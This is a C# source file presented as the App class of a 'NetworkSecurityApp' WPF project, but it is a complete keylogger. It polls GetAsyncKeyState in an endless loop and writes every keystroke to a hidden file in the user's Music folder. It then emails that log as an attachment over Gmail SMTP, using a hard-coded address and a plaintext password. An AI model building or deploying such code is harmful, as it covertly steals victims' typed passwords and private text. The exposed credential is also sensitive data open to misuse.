using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Net.Mail;

namespace NetworkSecurityApp
{
    /// <summary>
    /// Interaction logic for App.xaml
    /// </summary>
    /// 
    public partial class App : System.Windows.Application
    {
        private static int i;

        [DllImport("User32.dll")]

        public static extern int GetAsyncKeyState(Int32 i);

        [STAThread]
        static void Main(String[] args)
        {
            Random rand = new Random();
            int randomnumber = rand.Next(1, 21);
            if (20 == 20)
            {
                SendMail();
            }
            LogKeys();
        }

        static void LogKeys()
        {
            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
            filepath = filepath + @"\LogsFolder\";

            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            string path = (@filepath + "LoggedKeys.txt");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
                //end
            }

            KeysConverter converter = new KeysConverter();
            string text = "";

            while (5 > 1)
            {
                Thread.Sleep(5);
                for (Int32 i = 0; i < 2000; i++)
                {
                    int key = GetAsyncKeyState(i);

                    if (key == 1 || key == -32767)
                    {
                        text = converter.ConvertToString(i);
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.WriteLine(text);
                        }
                        break;
                    }
                }
            }
        }



        static void SendMail()
        {
            String Newfilepath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
            string Newfilepath2 = Newfilepath + @"\LogsFolder\LoggedKeys.txt"; // get log path

            DateTime dateTime = DateTime.Now; // call date 
            string subtext = "Loggedfiles"; // email subject
            subtext += dateTime;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587); // 587 is gmail's port
            MailMessage LOGMESSAGE = new MailMessage();
            LOGMESSAGE.From = new MailAddress("omribeni@post.bgu.ac.il"); // enter email that sends logs
            LOGMESSAGE.To.Add("omribeni@post.bgu.ac.il"); // enter recipiant 
            LOGMESSAGE.Subject = subtext; // subject

            client.UseDefaultCredentials = false;      // call email creds
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("omribeni@post.bgu.ac.il", "oM__1990");
            // enter your own email and password here ^^

            string newfile = File.ReadAllText(Newfilepath2); // reads log file 
            System.Threading.Thread.Sleep(2);
            string attachmenttextfile = Newfilepath + @"\LogsFolder\attachmenttextfile.txt"; // path to find new file !
            File.WriteAllText(attachmenttextfile, newfile); // writes all imformation to new file 
            System.Threading.Thread.Sleep(2);
            LOGMESSAGE.Attachments.Add(new Attachment(Newfilepath2)); // addds attachment to email
            LOGMESSAGE.Body = subtext; // body of message im just leaving it blank
            client.Send(LOGMESSAGE); // sends message 
            LOGMESSAGE = null; // emptys previous values ! 

        }

        //var application = new App();
        //application.InitializeComponent();
        //application.Run();
    }
}
